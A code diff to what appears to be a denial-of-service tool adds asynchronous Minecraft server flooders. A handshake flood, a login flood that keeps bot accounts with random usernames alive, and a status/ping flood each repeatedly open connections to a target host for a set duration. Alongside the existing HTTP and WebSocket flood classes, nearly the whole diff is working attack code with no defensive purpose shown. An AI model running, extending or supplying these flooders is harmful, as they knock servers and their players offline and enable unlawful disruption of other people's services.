@@ -15,6 +15,23 @@ from .logger import getLogger
 logger = getLogger("Flood")
 
 
+class BaseFlood:
+    def __init__(self, endpoint, duration: int):
+        self.endpoint = endpoint
+        self.until = datetime.now() + timedelta(seconds=duration)
+        self._tasks: List[asyncio.Task] = []
+
+    def _run_async(self, coro) -> None:
+        task = asyncio.create_task(coro)
+        self._tasks.append(task)
+
+    async def wait_done(self) -> None:
+        await asyncio.gather(*self._tasks, return_exceptions=True)
+
+    def _is_expired(self) -> bool:
+        return (self.until - datetime.now()).total_seconds() <= 0
+
+
 class L7Async:
     def __init__(self, endpoint, duration: int = 30):
         self.endpoint = endpoint
@@ -346,3 +363,210 @@ class WebSocketFlood:
 
     async def wait_done(self) -> None:
         await asyncio.gather(*self._tasks, return_exceptions=True)
+
+
+class MinecraftProtocol:
+    PROTOCOL_VERSION = 774
+
+    @staticmethod
+    def _varint(value: int) -> bytes:
+        result = b""
+        while True:
+            byte = (value & 0x7F) | (0x80 if value > 0x7F else 0)
+            result += bytes([byte])
+            value >>= 7
+            if value == 0:
+                break
+        return result
+
+    def _create_handshake_packet(self, next_state: int) -> bytes:
+        packet_id = self._varint(0x00)
+        protocol_version = self._varint(self.PROTOCOL_VERSION)
+        server_address = self.endpoint.host.encode("utf-8")
+        server_port = self.endpoint.port.to_bytes(2, "big")
+        next_state_varint = self._varint(next_state)
+
+        data = (
+            protocol_version
+            + self._varint(len(server_address))
+            + server_address
+            + server_port
+            + next_state_varint
+        )
+        payload = packet_id + data
+        return self._varint(len(payload)) + payload
+
+
+class MinecraftHandshakeFlood(MinecraftProtocol, BaseFlood):
+    def __init__(self, endpoint, duration: int = 30):
+        BaseFlood.__init__(self, endpoint, duration)
+        self.endpoint = endpoint
+
+    async def _handshake_flood(self) -> None:
+        while not self._is_expired():
+            try:
+                reader, writer = await asyncio.open_connection(
+                    self.endpoint.host, self.endpoint.port
+                )
+                packet = self._create_handshake_packet(1)
+                writer.write(packet)
+                await writer.drain()
+                writer.close()
+                await writer.wait_closed()
+            except Exception:
+                logger.debug("MC handshake failed")
+
+    def start(self) -> None:
+        self._run_async(self._handshake_flood())
+
+
+class MinecraftLoginFlood(MinecraftProtocol, BaseFlood):
+    def __init__(self, endpoint, duration: int = 30, username: str = None):
+        BaseFlood.__init__(self, endpoint, duration)
+        self.endpoint = endpoint
+        self.base_username = username or "Player"
+
+    def _create_login_start_packet(self, username: str) -> bytes:
+        packet_id = self._varint(0x00)
+        username_bytes = username.encode("utf-8")
+        uuid_bytes = b"\x00" * 16
+        data = self._varint(len(username_bytes)) + username_bytes + uuid_bytes
+        payload = packet_id + data
+        return self._varint(len(payload)) + payload
+
+    def _create_chat_packet(self, message: str) -> bytes:
+        packet_id = self._varint(0x05)
+        message_bytes = message.encode("utf-8")
+        data = self._varint(len(message_bytes)) + message_bytes
+        payload = packet_id + data
+        return self._varint(len(payload)) + payload
+
+    def _create_keepalive_packet(self, keepalive_id: int) -> bytes:
+        packet_id = self._varint(0x11)
+        data = keepalive_id.to_bytes(8, "big")
+        payload = packet_id + data
+        return self._varint(len(payload)) + payload
+
+    async def _login_flood(self) -> None:
+        while not self._is_expired():
+            try:
+                username = f"{self.base_username}{random.randint(1, 99999)}"
+                reader, writer = await asyncio.open_connection(
+                    self.endpoint.host, self.endpoint.port
+                )
+
+                handshake = self._create_handshake_packet(2)
+                writer.write(handshake)
+                await writer.drain()
+
+                await asyncio.sleep(0.1)
+
+                login_start = self._create_login_start_packet(username)
+                writer.write(login_start)
+                await writer.drain()
+
+                login_success = False
+                keepalive_id = random.randint(1, 999999999)
+                last_keepalive = datetime.now()
+
+                while not self._is_expired():
+                    try:
+                        async with asyncio.timeout(1):
+                            length_bytes = await reader.read(1)
+                            if not length_bytes:
+                                break
+
+                            length = int.from_bytes(length_bytes, "big")
+                            if length > 127:
+                                extra = await reader.read(1)
+                                length = int.from_bytes(length_bytes + extra, "big")
+
+                            packet_data = await reader.read(length)
+
+                            if len(packet_data) > 0:
+                                packet_id = int.from_bytes(packet_data[:1], "big")
+
+                                if packet_id == 0x02:
+                                    login_success = True
+
+                                elif packet_id == 0x1F:
+                                    keepalive_id = int.from_bytes(
+                                        packet_data[1:9], "big"
+                                    )
+                                    keepalive_response = self._create_keepalive_packet(
+                                        keepalive_id
+                                    )
+                                    writer.write(keepalive_response)
+                                    await writer.drain()
+                                    last_keepalive = datetime.now()
+
+                    except asyncio.TimeoutError:
+                        if (
+                            login_success
+                            and (datetime.now() - last_keepalive).total_seconds() > 10
+                        ):
+                            keepalive_response = self._create_keepalive_packet(
+                                keepalive_id
+                            )
+                            writer.write(keepalive_response)
+                            await writer.drain()
+                            last_keepalive = datetime.now()
+                    except Exception:
+                        break
+
+                writer.close()
+                await writer.wait_closed()
+            except Exception:
+                logger.debug("MC login failed")
+
+    def start(self) -> None:
+        self._run_async(self._login_flood())
+
+
+class MinecraftPingFlood(MinecraftProtocol, BaseFlood):
+    def __init__(self, endpoint, duration: int = 30):
+        BaseFlood.__init__(self, endpoint, duration)
+        self.endpoint = endpoint
+
+    def _create_status_request_packet(self) -> bytes:
+        packet_id = self._varint(0x00)
+        data = b""
+        payload = packet_id + data
+        return self._varint(len(payload)) + payload
+
+    def _create_ping_packet(self, timestamp: int) -> bytes:
+        packet_id = self._varint(0x01)
+        data = timestamp.to_bytes(8, "big")
+        payload = packet_id + data
+        return self._varint(len(payload)) + payload
+
+    async def _ping_flood(self) -> None:
+        while not self._is_expired():
+            try:
+                reader, writer = await asyncio.open_connection(
+                    self.endpoint.host, self.endpoint.port
+                )
+                packet = self._create_handshake_packet(1)
+                writer.write(packet)
+                await writer.drain()
+
+                await asyncio.sleep(0.1)
+
+                status_request = self._create_status_request_packet()
+                writer.write(status_request)
+                await writer.drain()
+
+                await asyncio.sleep(0.1)
+
+                ping = self._create_ping_packet(random.randint(1, 999999))
+                writer.write(ping)
+                await writer.drain()
+
+                await asyncio.sleep(0.3)
+                writer.close()
+                await writer.wait_closed()
+            except Exception:
+                logger.debug("MC ping failed")
+
+    def start(self) -> None:
+        self._run_async(self._ping_flood())
